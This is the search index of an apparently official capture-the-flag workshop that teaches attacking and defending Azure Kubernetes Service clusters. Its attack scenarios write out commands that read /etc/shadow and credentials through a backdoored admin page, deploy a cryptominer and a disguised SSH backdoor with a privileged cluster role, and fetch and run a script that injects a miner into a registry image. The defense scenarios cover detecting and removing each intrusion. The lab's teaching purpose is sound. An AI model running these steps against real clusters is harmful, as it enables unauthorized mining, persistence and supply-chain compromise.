{"config":{"lang":["en"],"separator":"[\\s\\-\\.]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"AKS CTF","text":"<p>Welcome to the Attacking and Defending Azure Kubernetes Service Clusters.  This is inspired by Secure Kubernetes, as presented at KubeCon NA 2019. We'll help you create your own AKS so you can follow along as we take on the role of two attacking personas looking to make some money and one defending persona working hard to keep the cluster safe and healthy.</p>"},{"location":"#getting-started","title":"Getting Started","text":"<p>Click on Getting Started in the table of contents and follow the directions.</p>"},{"location":"#about-the-creators","title":"About the Creators","text":"<ul> <li>@lastcoolnameleft is a Partner Solution Architect at Microsoft and has supported the Azure partner ecosystem enable and secure their Docker and Kubernetes deployments since joining Microsoft in 2007.</li> <li>@erleonard is a Partner Solution Architect at Microsoft focusing on Cloud-Native technologies.</li> <li>@markjgardner is a Principal Technical Specialist at Microsoft helping customers to adapt and modernize their business as they move to the cloud. When not working on containerizing all the things, Mark and his wife own and operate a 160 acre horse farm in Kentucky.</li> <li>@swgriffith is a Principal Technical Specialist on the Azure App Innovation Global Blackbelt team, where he helps customers build and secure cool things with Azure and Kubernetes. Steve loves securing container ecosystems and helping to educate others on complex and challenging issues. </li> </ul> <p>This workshop was inspired by https://github.com/securekubernetes/securekubernetes/ and the content created by those authors.</p>"},{"location":"getting_started/","title":"Getting Started","text":"<ol> <li> <p>Create a new Azure account or choose an existing one, as you prefer.</p> </li> <li> <p>Open a new tab to Azure Cloud Shell.  You can click here.</p> </li> <li> <p>Clone the repo: <code>git clone https://github.com/azure/aks-ctf.git &amp;&amp; cd aks-ctf/workshop</code></p> </li> <li> <p>Enable the Resource Providers:</p> <ul> <li><code>az provider register --namespace Microsoft.OperationsManagement</code></li> <li><code>az provider register --namespace Microsoft.ContainerService</code></li> </ul> </li> <li> <p>Once inside the Cloud Shell terminal, run setup.sh. This should create a new Project with a single-node Kubernetes cluster that contains the prerequisites for the workshop:     <pre><code>./setup.sh\nsource .env\n</code></pre></p> </li> </ol> <p>The script will prompt you for a project name (just hit enter to accept the default) and a password for your webshell instances.</p> <ol> <li>When the script is finished, verify it worked correctly.</li> </ol> <pre><code>kubectl get pods --namespace dev\n</code></pre> <p>The output should look similar to this: <pre><code>NAME                           READY   STATUS    RESTARTS   AGE\ninsecure-app-674cf64dd-qf7md   1/1     Running   0          63m\n</code></pre></p> <p>If it looks good, move on to Scenario 1 Attack.</p>"},{"location":"scenario_1_attack/","title":"Free Compute: Scenario 1 Attack","text":""},{"location":"scenario_1_attack/#warning","title":"Warning","text":"<p>In these Attack scenarios, we're going to be doing a lot of things that can be crimes if done without permission. Today, you have permission to perform these kinds of attacks against your assigned training environment.</p> <p>In the real world, use good judgment. Don't hurt people, don't get yourself in trouble. Only perform security assessments against your own systems, or with written permission from the owners.</p>"},{"location":"scenario_1_attack/#backstory","title":"Backstory","text":""},{"location":"scenario_1_attack/#name-red","title":"Name: Red","text":"<ul> <li>Opportunist</li> <li>Easy money via crypto-mining</li> <li>Uses automated scans of web IP space looking for known exploits and vulnerabilities</li> </ul>"},{"location":"scenario_1_attack/#motivations","title":"Motivations","text":"<ul> <li>Red has been mining <code>bitcoinero</code> (a fake cryptocurrency) for a few months now, and it's starting to gain some value</li> <li>Red is looking for free-to-them compute on which to run miners</li> <li>Red purchased some leaked credentials from the dark web</li> </ul>"},{"location":"scenario_1_attack/#thinking-in-graphs","title":"Thinking In Graphs","text":"<p>Attacking a system is a problem-solving process similar to troubleshooting: Red begins with a goal (deploy an unauthorized cryptominer) but doesn't really know what resources are available to achieve that goal. They will have to start with what little they already know, perform tests to learn more, and develop a plan. The plan is ever-evolving as new information is gleaned.</p> <p>The general process looks like this:</p> <p></p> <ul> <li> <p>Study</p> <p>In this phase, use enumeration tools to start from the information you have, and get more information. Which tools to use will depend on the situation. For example, <code>nmap</code> is commonly used to enumerate IP networks. <code>nikto</code>, <code>burp</code>, and <code>sqlmap</code> are interesting ways to learn more about web applications. Windows and Linux administrative utilities such as <code>uname</code>, <code>winver</code>, and <code>netstat</code> provide a wealth of information about their host OSes.</p> </li> <li> <p>Plan</p> <p>In this phase, think about everything you currently know, and what actions you can take based on that knowledge. If you think you can do something that will help you get closer to your goal, move onto Attack Something. Otherwise, go back to Study and try to learn more.</p> </li> <li> <p>Attack Something</p> <p>In this phase, you take some action in the hope of getting closer to your goal. This may be running an exploit tool against a buggy piece of software, launching some kind of credential-guessing utility, or even just running a system command like kubectl apply. Your success or failure will teach you more about your target and situation. Move on to Study, Persist, or Win, as appropriate.</p> </li> <li> <p>Persist</p> <p>In this optional phase, you take some action to make it easier to re-enter the system or network at a later time. Common options are running a malware Remote Access Tool such as Meterpreter, creating new accounts for later use, and stealing passwords.</p> </li> <li> <p>Win</p> <p>Eventually, you may achieve your goals. Congratulations! Now you can stop hacking and begin dreaming about your next goal.</p> </li> </ul>"},{"location":"scenario_1_attack/#getting-access","title":"Getting Access","text":"<p>Red team found an app online and ran a dictionary attack against it.  Some valid paths were <code>/crash</code> and <code>/admin</code>.  Let's try to find an exploit!</p> <p>To find the compromised website, run the following: <pre><code>./scenario_1/attack-1-helper.sh\n</code></pre> This is a message from the team that provided the leaked credentials.  Inside, you see 3 links.  </p> <p>In your browser, go to the first URL provided (e.g. <code>http://&lt;HACKED_IP&gt;:8080/</code>)</p> <p>Hmm.  \"Nothing to see here.\"?  They're probably wrong.</p> <p>Let's try the Admin page: <code>http://&lt;HACKED_IP&gt;:8080/admin</code>.  Hmm.  It's asking for credentials.  Since it was a browser popup (instead of an in-app request), it probably uses Basic Auth.</p> <p>Let's try the Crash page: <code>http://&lt;HACKED_IP&gt;:8080/crash</code></p> <p>Looks like we've crashed the app!  And it prints out all of the environment variables.  Oh goodie!  There are two values that seem to be especially interesting (AUTH_USERNAME and AUTH_PASSWORD).  Let's go back to the Admin page and try those.</p> <p>Go back to the Admin page: <code>http://&lt;HACKED_IP&gt;:8080/admin</code> and enter the credentials from the crash page.  </p> <p>And we're in!  Looks like Frank left a backdoor to run some commands.  Let's see what we can learn.</p> <p>Click into the \"Run a command\" textbox and then try each of the commands below:</p> <pre><code>id\n</code></pre> <pre><code>uname -a\n</code></pre> <pre><code>cat /etc/os-release\n</code></pre> <p><pre><code>ps -ef\n</code></pre> Note that there are very few processes running. This is probably a container.</p> <pre><code>df -h\n</code></pre> <p><pre><code>cat /etc/shadow\n</code></pre> <pre><code>ls -l /\n</code></pre> <pre><code>ls -l $PWD\n</code></pre> <pre><code>echo $PATH\n</code></pre></p> <p>Can we add files to the default PATH? <pre><code>touch /usr/local/bin/foo &amp;&amp; ls /usr/local/bin/\n</code></pre> It looks like we can.</p> <p>Now let's inspect our environment: <pre><code>env\n</code></pre></p> <p>This tells us two things:</p> <ul> <li>We are in a container</li> <li>It's managed by Kubernetes</li> </ul> <p>Let's poke around some more and see if we can find any credentials. <pre><code>ls /var/run/secrets/kubernetes.io/serviceaccount\n</code></pre></p>"},{"location":"scenario_1_attack/#deploy-bitcoin-miner-backdoor","title":"Deploy Bitcoin miner + backdoor","text":"<p>We have typical Kubernetes-related environment variables defined, and we have anonymous access to some parts of the Kubernetes API. We can see that the Kubernetes version is modern and supported -- but there's still hope if the Kubernetes security configuration is sloppy. Let's check for that next:</p> <p>Note</p> <p>This may take a minute or two. Watch the page progress in the browser tab.</p> <p><pre><code>cd /usr/local/bin; curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"; chmod 555 kubectl; kubectl version\n</code></pre> <pre><code>kubectl get all\n</code></pre> What workloads are deployed in all of the namespaces? <pre><code>kubectl get all -A\n</code></pre> What operations can I run on this cluster? <pre><code>kubectl auth can-i --list\n</code></pre> Can I create pods? <pre><code>kubectl auth can-i create pods\n</code></pre></p> <p>It looks like we have hit the jackpot! Let's see if we can start mining some crypto. <pre><code>kubectl apply -f https://raw.githubusercontent.com/azure/aks-ctf/refs/heads/main/workshop/scenario_1/bitcoinero.yaml; sleep 10; kubectl get pods -n dev\n</code></pre></p> <p>We can see the bitcoinero pod running, starting to generate a small but steady stream of cryptocurrency. But we need to take a few more steps to protect our access to this lucrative opportunity. Let's deploy an SSH server on the cluster to give us a backdoor in case we lose our current access later.</p> <pre><code>kubectl apply -n kube-system -f https://raw.githubusercontent.com/azure/aks-ctf/refs/heads/main/workshop/scenario_1/backdoor.yaml\n</code></pre> <p>Wait ~10 seconds for the Public IP to be exposed <pre><code>kubectl get svc metrics-server-service -n kube-system -o table -o jsonpath='{.status.loadBalancer.ingress[0].ip}'\n</code></pre></p> <p>Our Bitcoin miner is now deployed and we've also deployed an SSH backdoor.  Mission Accomplished.</p>"},{"location":"scenario_1_defense/","title":"Free Compute: Scenario 1 Defense","text":""},{"location":"scenario_1_defense/#backstory","title":"Backstory","text":""},{"location":"scenario_1_defense/#name-blue","title":"Name: Blue","text":"<ul> <li>Overworked</li> <li>Can only do the bare minimum</li> <li>Uses defaults when configuring systems</li> <li>Usually gets blamed for stability or security issues</li> <li>Has no experience operating Kubernetes clusters</li> </ul>"},{"location":"scenario_1_defense/#motivations","title":"Motivations","text":"<ul> <li>Blue gets paged at 1am with an \u201curgent\u201d problem: the developers say \u201cthe website is slow\u201d</li> <li>Blue reluctantly agrees to take a \u201cquick look\u201d</li> <li>Blue wants desperately to get back to sleep. Zzz</li> </ul>"},{"location":"scenario_1_defense/#defense","title":"Defense","text":"<p>Blue looks at the page with an unsurprising lack of details, and spends a few minutes getting the answer to exactly which website they are referring to that is underperforming.  It's \"the one running in Kubernetes\", they said.  Blue leverages their Cloud Shell terminal to begin the process of troubleshooting the issue.</p>"},{"location":"scenario_1_defense/#identifying-the-issue","title":"Identifying the Issue","text":"<p>The first step is to determine the name for the web application <code>deployment</code> in question.  From the terminal, Blue runs the following to see a listing of all <code>pods</code> in all <code>namespaces</code>:</p> <pre><code>kubectl get pods --all-namespaces\n</code></pre> <p>The <code>cluster</code> is relatively small in size, but it has a couple <code>deployments</code> that could be the site in question.  The development team mentions performance is an issue, so Blue checks the current CPU and Memory usage with:</p> <pre><code>kubectl top node\n</code></pre> <p>and</p> <pre><code>kubectl top pod --all-namespaces\n</code></pre> <p>It appears that a suspcious <code>deployment</code> named <code>bitcoinero</code> is running, and its causing resource contention issues.  Blue runs the following to see the <code>pod's</code> full configuration:</p> <pre><code>kubectl get deployment -n dev bitcoinero -o yaml\n</code></pre> <p>It was created very recently, but there are no ports listening, so this looks unlikely to be part of the website.  Next, Blue grabs a consolidated listing of all images running in the <code>cluster</code>:</p> <pre><code>kubectl get pods --all-namespaces -o jsonpath=\"{..image}\" | tr -s '[[:space:]]' '\\n' | sort -u\n</code></pre>"},{"location":"scenario_1_defense/#confirming-the-foreign-workload","title":"Confirming the Foreign Workload","text":"<p>Blue sends a message back to the developers asking for confirmation of the suspicious <code>bitcoinero</code> image, and they all agree they don't know who created the <code>deployment</code>. Blue looks at the audit logs for the AKS cluster in the Azure Portal.</p> <p>Note</p> <p>You may need to change from Simple Mode to KQL Mode in your Log Analytics Workspace</p> <p><pre><code>AKSAuditAdmin\n| where RequestUri startswith \"/apis/apps/v1/namespaces/dev/\" \n    and Verb == \"create\" \n    and ObjectRef contains \"bitcoinero\"\n| project User, SourceIps, UserAgent, ObjectRef, TimeGenerated\n</code></pre> </p> <p>Blue sees that the <code>bitcoinero</code> <code>deployment</code> was created by the cluster admin using the kubectl commandline interface. The IP addresses also show that whoever this was connected from outside the company network.</p>"},{"location":"scenario_1_defense/#cleaning-up","title":"Cleaning Up","text":"<p>Unsure of exactly who created the <code>bitcoinero</code> <code>deployment</code>, Blue decides that it's now 3am, and the commands are blurring together.  The website is still slow, so Blue decides to  delete the <code>deployment</code>:</p> <pre><code>kubectl get deployments -n dev\nkubectl delete deployment bitcoinero -n dev\n</code></pre>"},{"location":"scenario_1_defense/#stopping-further-intrusions","title":"Stopping further intrusions","text":"<p>Blue remembers that when deploying the AKS cluster they had the option to specify what IP addresses are allowed to connect to the public API server of the cluster. Perhaps now is the time to implement that feature. Let's make sure that the API server will only accept connections from Blue's IP as well as any ip within the corporate network: <pre><code>MY_PUBLIC_IP=$(curl -s ifconfig.me)\naz aks update -n $AKS_NAME -g $RESOURCE_GROUP \\\n    --api-server-authorized-ip-ranges $MY_PUBLIC_IP/32\n</code></pre></p> <p>Tip</p> <p>The above command takes about 3-5 minutes.</p>"},{"location":"scenario_1_defense/#giving-the-all-clear","title":"Giving the \"All Clear\"","text":"<p>Seeing what looks like a \"happy\" <code>cluster</code>, Blue emails their boss that there was a workload using too many resources that wasn't actually needed, so it was deleted.  Also, they added some additional \"security\" just in case.</p>"},{"location":"scenario_2_attack/","title":"Persistence: Scenario 2 Attack","text":""},{"location":"scenario_2_attack/#backstory","title":"Backstory","text":""},{"location":"scenario_2_attack/#name-red","title":"Name: Red","text":"<ul> <li>Opportunist</li> <li>Easy money via crypto-mining</li> <li>Uses automated scans of web IP space looking for known exploits and vulnerabilities</li> </ul>"},{"location":"scenario_2_attack/#motivations","title":"Motivations","text":"<ul> <li>Red notices that public access to the cluster is gone and the cryptominers have stopped reporting in</li> <li>Red is excited to discover that the SSH server they left behind is still active</li> </ul>"},{"location":"scenario_2_attack/#re-establishing-a-foothold","title":"Re-establishing a Foothold","text":"<p>Red reconnects to the cluster using the SSH service disguised as a metrics-server on the cluster. While having access to an individual container may not seem like much of a risk at first glance, this container has two characteristics that make it very dangerous:  </p> <ul> <li>There is a service account associated with the container which has been granted access to all kubernetes APIs</li> <li>The container is running with a privileged security context which grants it direct access to the host OS</li> </ul>"},{"location":"scenario_2_attack/#deploying-miners","title":"Deploying Miners","text":"<p>You will need the SSH server IP address that was deployed in the previous attack.  You can fetch it again in the hacked app by running: <pre><code>SSH_SERVER_IP=$(kubectl get svc metrics-server-service -n kube-system -o table -o jsonpath='{.status.loadBalancer.ingress[0].ip}')\necho $SSH_SERVER_IP\necho \"SSH password is: Sup3r_S3cr3t_P@ssw0rd\"\nssh root@$SSH_SERVER_IP -p 8080 -o StrictHostKeyChecking=no\n</code></pre></p> <p>Let's re-download kubectl and create our miner: <pre><code>apk update\napk add curl\ncd /usr/local/bin\ncurl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"\nchmod 555 kubectl\nexport KUBERNETES_SERVICE_HOST=kubernetes.default.svc\nexport KUBERNETES_SERVICE_PORT=443\nkubectl apply -f https://raw.githubusercontent.com/azure/aks-ctf/refs/heads/main/workshop/scenario_1/bitcoinero.yaml\n</code></pre></p> <p>Verify that the pod is running: <pre><code>kubectl get pods -n dev\n</code></pre></p> <p>The output should look something like this: <pre><code>NAME                           READY   STATUS    RESTARTS   AGE\nbitcoinero-6b95755447-cttkz    1/1     Running   0          23s\ninsecure-app-66dffb686-tp46w   1/1     Running   0          24m\n</code></pre></p> <p>Time for some celebratory pizza! Go ahead and logout of the ssh session. <pre><code>exit\n</code></pre></p>"},{"location":"scenario_2_defense/","title":"Persistence: Scenario 2 Defense","text":""},{"location":"scenario_2_defense/#backstory","title":"Backstory","text":""},{"location":"scenario_2_defense/#name-blue","title":"Name: Blue","text":"<ul> <li>Still overworked</li> <li>Still can only do the bare minimum</li> <li>Uses the defaults when configuring systems</li> <li>Usually gets blamed for stability or security issues</li> </ul>"},{"location":"scenario_2_defense/#motivations","title":"Motivations","text":"<ul> <li>A week after the first incident, Blue gets paged at 3am because \u201cthe website is slow again\u201d.</li> <li>Blue, puzzled, takes another look.</li> <li>Blue decides to dust off the r\u00e9sum\u00e9 \u201cjust in case\u201d.</li> </ul>"},{"location":"scenario_2_defense/#defense","title":"Defense","text":"<p>Blue is paged again with the same message as last time. What is going on? Could this be the same problem again?</p>"},{"location":"scenario_2_defense/#identifying-the-issue","title":"Identifying the Issue","text":"<p>Let's run some basic checks again to see if we can find random workloads:</p> <pre><code>kubectl get pods --all-namespaces\n</code></pre> <p>It's back! But how? Let's check the audit logs again:</p> <p><pre><code>AKSAuditAdmin\n| where RequestUri startswith \"/apis/apps/v1/namespaces/dev/deployments\" \n    and Verb == \"create\" \n    and ObjectRef contains \"bitcoinero\"\n| project User, SourceIps, UserAgent, ObjectRef, TimeGenerated\n</code></pre> </p> <p>How did a service account associated with the metrics-server create a deployment? And what is that sourceIP, it looks familiar...</p> <p>Let's fetch the public egress IP address for the cluster API server. First start a pod we can use to curl out of the cluster:</p> <pre><code>kubectl run curl --rm -it --image=alpine/curl -- sh\n</code></pre> <p>From within the pod, fetch the cluster egress ip from an external ip echo service: <pre><code>curl icanhazip.com\nexit\n</code></pre></p> <p>So let me get this straight... the <code>bitcoinero deployment</code> was created by another deployment's service account, using curl, from inside the cluster? </p> <p>Blue is starting to suspect that there may be an unwanted visitor in the cluster. But how to find them? Let's by looking for <code>ClusterRoles</code> with high levels of permissions.</p> <p>List all ClusterRoles with unlimited access to all APIs and resource types: <pre><code>kubectl get clusterrole -o json | jq '.items[] | select(.rules[]?.resources == [\"*\"] and .rules[]?.verbs == [\"*\"] and .rules[]?.verbs == [\"*\"]) | .metadata.name'\n</code></pre></p> <p><code>cluster-admin</code> is the only role that should be in that list. What is this <code>privileged-role</code> that we are also seeing? <pre><code>kubectl get clusterrolebinding -o json | jq '.items[] | select(.roleRef.name == \"privileged-role\")'\n</code></pre></p> <p>Why would the <code>metrics-server</code> need such high level privileges? Let's take a closer look at that deployment.</p> <p>Look at the command that is being run for the deployment.  (Hint: Should a metrics server be running sshd?) <pre><code>kubectl get deployment -n kube-system metrics-server-deployment -o yaml\n</code></pre></p> <p>Look at the metric-server service.  (Hint: Should that be public?) <pre><code>kubectl get svc -n kube-system metrics-server-service -o yaml\n</code></pre></p> <p><code>metrics-server</code> is actually running an SSH server! And it's running as a privileged container! This is bad. We need to clean this up fast!</p>"},{"location":"scenario_2_defense/#fixing-the-leak","title":"Fixing the Leak","text":"<p>Blue decides it is time to evict this bad actor once and for all. Let's delete all of their work: <pre><code># Service\nkubectl delete service -n kube-system metrics-server-service --wait=false\n# Deployment\nkubectl delete deployment -n kube-system metrics-server-deployment --wait=false\n# ClusterRoleBinding\nkubectl delete clusterrolebinding privileged-binding\n# ClusterRole\nkubectl delete clusterrole privileged-role\n# ServiceAccount\nkubectl delete sa -n kube-system metrics-server-account\n# bitcoinero\nkubectl delete deployment bitcoinero -n dev --wait=false\n</code></pre></p> <p>The fire is out (for now). But clearly we need more robust security to keep the bad guys out. How can we restrict access to ensure that only trusted users can interact with the cluster control plane?</p> <p>Let's enable Entra ID integration and disable local administrative accounts. This way only users who are authenticated by our Entra tenant will have access to the cluster and we can control what those user can do by managing group membership in Entra.</p> <p>First we will want to create a group in Entra that contains all of the cluster admins (and make sure our account is in it so we don't get lockd out): <pre><code>GROUP_NAME=AKSAdmins$RANDOM\nADMIN_GROUP=$(az ad group create --display-name \"$GROUP_NAME\" --mail-nickname \"$GROUP_NAME\" --query id -o tsv)\naz ad group member add --group \"$GROUP_NAME\" --member-id $(az ad signed-in-user show --query id -o tsv)\n</code></pre></p> <p>Now let's enable EntraID integration and disable local accounts:  <pre><code>az aks update --resource-group $RESOURCE_GROUP --name $AKS_NAME \\\n  --enable-aad \\\n  --aad-admin-group-object-ids $ADMIN_GROUP \\\n  --disable-local-accounts\n</code></pre></p> <p>Tip</p> <p>The above command takes about 8 minutes to complete.</p> <p>Finally, we need to rotate the cluster certificates in order to invalidate the existing leaked admin credentials. This will require us to authenticate against EntraID for all future cluster administration: <pre><code>az aks rotate-certs --resource-group $RESOURCE_GROUP --name $AKS_NAME -y\n</code></pre></p> <p>Tip</p> <p>The above command takes about 6 minutes to complete.</p> <p>We can verify that we have lost access to cluster by running any kubectl command: <pre><code>kubectl get pods\n</code></pre></p> <p>To reconnect to the cluster we will need to fetch new credentials, this time backed by Entra: <pre><code>az aks get-credentials --resource-group $RESOURCE_GROUP --name $AKS_NAME --overwrite-existing\nkubectl get pods -A\n</code></pre></p> <p>Now, when we try to interact with the cluster, we are prompted to login with our Entra credentials.</p> <p>Note</p> <p>If you are running this lab inside of a managed tenant with strict conditional access policies you may need to run <code>az login &amp;&amp; kubelogin convert-kubeconfig -l azurecli</code> before connecting to the cluster.</p> <p>Confident that the cluster is now running in \"Fort Knox\" mode, Blue decides to call it a night and head back to bed.</p> <p>Note</p> <p>Another layer of security that would be a good idea to investigate here is Azure Policy. But for the purposes of this lab, we will skip it for now.</p>"},{"location":"scenario_3_attack/","title":"The calls are coming from inside the container! Scenario 3 Attack","text":""},{"location":"scenario_3_attack/#red-team-update","title":"Red Team Update","text":"<p>It appears the blue team has again deleted our bitcoinero pods.  It's time to get sneakier.  Instead of trying to deploy new pods into their cluster, let's poke around to see if there's anything we can use.</p> <p>Lets see if there are any credentials accessible.</p> <p>In the hacked admin panel, run the following: <pre><code>cd /usr/local/bin; curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"; chmod 555 kubectl\n</code></pre> <pre><code>kubectl get secrets\n</code></pre></p> <p>Ooh.  There's something called <code>acr-secret</code>.  Let's dig in. <pre><code>kubectl get secrets/acr-secret -o json\n</code></pre></p> <p>There's a .dockerconfigjson file in the secret that appears to be Base64 encoded</p> <pre><code>kubectl get secrets/acr-secret -o json | jq -r '.data.\".dockerconfigjson\"' | base64 -d - | jq\n</code></pre> <p>Now we're talking!  It looks like they put the admin credentials for their registry in a secret.  I bet we can use this to both PUSH and PULL new images to their registry.</p> <p>We can use Buildah to create, pull and push container images.  However, we will need escalated privledges.  </p> <p>Some of the other red-team members have found this neat trick from Twitter, which deploy a container that gives us full host access.  Let's work with them to find a way to utilize this.</p> <p>... TIME PASSES ...</p> <p>Good luck!  They've come up with two scripts:</p> <ul> <li>run-bitcoin-injector.sh - deploys a Kubernetes Job that uses the registry credentials we found, to create another pod that injects our bitcoinero miner into the container</li> <li>inject-image.sh - Uses Buildah to pull the current app image, inject the bitcoinero miner into the image and re-publish the image under the same name</li> </ul> <p>Let's go back to our admin panel and run the following:</p> <pre><code>curl -O -J https://raw.githubusercontent.com/azure/aks-ctf/refs/heads/main/workshop/scenario_3/run-bitcoin-injector.sh; bash run-bitcoin-injector.sh\n</code></pre> <p>Tip</p> <p>This command may take 1-2 minutes to run. Do not referesh the browser page. Wait for the command to complete.</p> <p>Everything has been installed.  Let's kill our process and let the new image come up <pre><code>kubectl delete pod $HOSTNAME\n</code></pre></p> <p>The page immediately died (which is understandable since we killed the pod).  Let's reload the page and see if we were successful.  Run the following command in the admin page</p> <pre><code>ps\n</code></pre> <p>Our <code>moneymoneymoney</code> process is there and running inside their container!  Good luck finding that one!</p>"},{"location":"scenario_3_defense/","title":"The calls are coming from inside the container! Scenario 3 Defense","text":"<p>We've gotten paged.  AGAIN!  Let's check the cluster.</p> <p>Any unwanted open ports? <pre><code>kubectl get service -A\n</code></pre></p> <p>Any unwanted pods?  <pre><code>kubectl get pods -A\n</code></pre></p> <p>Where's the spike coming from?  <pre><code>kubectl top node\n</code></pre></p> <p>What pods? <pre><code>kubectl top pod -A\n</code></pre></p> <p>Wait...what is this <code>bitcoin-injector</code>?  It's showing as completed, so it's not running anymore, so it can't be causing the problem. Did the hackers get sloppy and leave something behind?  We'll check this out later because we need to stop the bleeding.</p> <p>Why is our app running so hot? <pre><code>kubectl get pods -n dev\nPOD=$(kubectl get pod -n dev -l=app=insecure-app -o json | jq '.items[0].metadata.name' -r)\necho $POD\nkubectl exec -it $POD -n dev -- ps -ef\n</code></pre></p> <p>There's a foreign workload <code>moneymoneymoney</code> running in our app!  How did this get in here?!</p> <p>Let's delete the pod:  <pre><code>kubectl delete pod -n dev --force --grace-period=0 $POD\n</code></pre></p> <p>But just to be sure, let's verify that process is gone.</p> <pre><code>POD=$(kubectl get pod -n dev -l=app=insecure-app -o json | jq '.items[0].metadata.name' -r)\nkubectl exec -it $POD -n dev -- ps -ef\n</code></pre> <p>This...is not good.  The miner is running inside the app and restarting the app also restarted the miner.  Is our app infected?!  How could this have happened?!</p> <p>Let's go re-investigate that <code>bitcoin-injector</code> pod: <pre><code>kubectl describe pods -n dev -l job-name=bitcoin-injector\n</code></pre></p> <p>Looks like it was started as Job/bitcoin-injector.</p> <pre><code>kubectl logs -n dev -l job-name=bitcoin-injector\n</code></pre> <p>Looks like the output of a Docker build command...</p> <p>It seems like they got our container registry credentials and then used that to push a new one with the exact same name!  But how did they get that?</p> <p>Let's look at the Log Analytics Audit Logs: <pre><code>AKSAuditAdmin\n| where RequestUri startswith \"/apis/batch\"\n    and Verb == \"create\" \n| project ObjectRef, User, SourceIps, UserAgent, TimeGenerated\n</code></pre></p> <p>It appears that the request came from <code>insecure-app</code>.  But how?</p> <p>Looking at the source code, it appears there's an <code>/admin</code> page which Frank added this to the code years ago and was fired after that \"inappropriate use of company resources\" issue.</p> <p>And the attackers were able to use this really permissive Service Account role binding to get escalated privledges to the cluster.</p> <p>We need a plan of defense:</p> <ul> <li>Remove the infected image</li> <li>Stop using container registry admin credentials</li> <li>Enable Defender for Containers </li> <li>Downgrade/remove SA permissions (change verbs from * to GET)</li> <li>Open Issue to tell developer to remove /admin page</li> <li>Re-build and deploy image</li> </ul>"},{"location":"scenario_3_defense/#remove-the-infected-image","title":"Remove the infected image","text":"<p>Let's start by reverting the app deployment to the last known good image. Start by inspecting the image reference in the deployment manifest: <pre><code>kubectl get deployment insecure-app -n dev -o=jsonpath='{.spec.template.spec.containers[*].image}'\n</code></pre></p> <p>The app team deployed by referencing the <code>latest</code> tag for their container image. This exposes their deployment to exploits like the one we just discovered. Let's update their deployment to reference a more specific tag ('1.0'): <pre><code>kubectl set image deployment/insecure-app -n dev insecure-app=$ACR_NAME.azurecr.io/insecure-app:1.0\n</code></pre></p> <p>Updating the image on the deployment also has the side-effect of killing all pods currently running the infected image and relaunching them using the updated image tag.</p> <p>Now let's remove the infected image from the registry: <pre><code>az acr repository delete -n $ACR_NAME -t insecure-app:latest -y\n</code></pre></p> <p>Finally, since the infected insecure-app and bitcoinero images are still cached locally on the node, we need to make sure those are removed to prevent another container from starting up with the old images. Let's install the AKS Image Cleaner.  This will ensure that unused images (such as the infected insecure-app and bitcoinero) are cleared from the node. <pre><code>az aks update --name $AKS_NAME --resource-group $RESOURCE_GROUP  --enable-image-cleaner\n</code></pre></p>"},{"location":"scenario_3_defense/#stop-using-container-registry-admin-credentials","title":"Stop using container registry admin credentials","text":"<p>Instead of providing the ACR admin credentials, let's Attach the ACR to the cluster.</p> <pre><code>kubectl delete -n dev secrets/acr-secret\naz aks update --name $AKS_NAME --resource-group $RESOURCE_GROUP --attach-acr $ACR_NAME\n</code></pre>"},{"location":"scenario_3_defense/#enable-defender-for-containers","title":"Enable Defender for Containers","text":"<p>Now that you've fixed the permissions on pulling images from ACR, you want to get alerted in case anything else gets added to our registry or the cluster.  </p> <p>For this, we could enable Azure Defender for Containers</p> <p>The image injection would have been detected with Binary drift detection.  </p> <p>The binary drift detection feature alerts you when there's a difference between the workload that came from the image, and the workload running in the container. It alerts you about potential security threats by detecting unauthorized external processes within containers.</p>"},{"location":"scenario_3_defense/#fix-container-permissions","title":"Fix container permissions","text":"<p>Let's look at the problematic cluster role:</p> <pre><code>kubectl describe clusterroles insecure-app-role\n</code></pre> <p>This shows that that this role was able to perform all \"verbs\" on all \"resources\" inside the cluster.  That is WAY too permissive!</p> <p>We got confirmation from the developer that the app needs to be able to see (but not modify) other pods in the namespace.  </p> <p>Instead of a \"clusterrole\" (which has access to the entire cluster), we should use a \"role\" (which has access to the specific namespace).</p> <p>Let's delete the clusterrole and clusterolebinding and update the role to be less permissive:</p> <pre><code>kubectl delete clusterrolebinding insecure-app-binding\nkubectl delete clusterrole insecure-app-role\nkubectl create role pod-reader --verb=get --verb=list --verb=watch --resource=pods\nkubectl create rolebinding pod-reader-binding --role=pod-reader --serviceaccount=dev:insecure-app-sa\n</code></pre> <p>And with that, we can now rest.</p> <p>Hopefully...</p>"},{"location":"wrapup/","title":"Wrap-up","text":"<p>Congrats! Remember to delete your project so it won't keep running and accruing charges!</p> <p>You can delete it through the web interface, or with the following Azure CLI command:</p> <pre><code>az group delete -n $RESOURCE_GROUP\n</code></pre>"},{"location":"coach/","title":"Securing AKS Coaches Guide","text":"<p>This is a workshop designed to help operations teams understand the different security options inside Azure for AKS.  </p>"},{"location":"coach/#getting-started","title":"Getting Started","text":"<p>You and each participant should be aware that:   * This workshops intentionally deploys an insecure app which will have a vulnerability that can be exploited to take over the cluster   * The environment should only run for as short of a time as possible.</p> <p>Perform the following: * Read and understand the narrative * Ensure each participant has the ability to create a VNET and an AKS cluster * Deploy the CTFd</p>"}]}